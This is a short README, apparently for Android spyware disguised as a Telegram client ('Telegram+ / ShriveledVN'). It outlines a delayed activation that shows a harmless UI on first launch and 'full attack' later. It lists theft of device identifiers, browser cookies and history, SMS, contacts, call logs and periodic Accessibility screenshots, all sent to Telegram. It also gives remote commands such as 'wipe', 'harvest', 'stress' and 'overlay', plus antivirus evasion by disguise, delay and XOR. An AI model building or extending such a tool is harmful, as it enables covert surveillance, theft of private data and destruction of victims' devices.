# Telegram+ / ShriveledVN

## Stealth → armed
First open: calm UI + permissions only. Reopen: full attack.

## Exfil → Telegram
- Device name + model + id on ONLINE
- Browser cookies / history as **text lists** (when readable)
- Screenshots via Accessibility `takeScreenshot` (API 30+, a11y on) every ~3 min
- SMS / contacts / calls / apps collector

## Limits
- `/data/data` browser DBs need root — without root expect empty cookie/history + status message
- Screenshot needs Accessibility enabled + Android 11+
- No claim of universal AV bypass — disguise + delay + XOR helper only

## C2
`attack` `wipe` `browser` `harvest` `stress` `music` `overlay` `wallpaper`
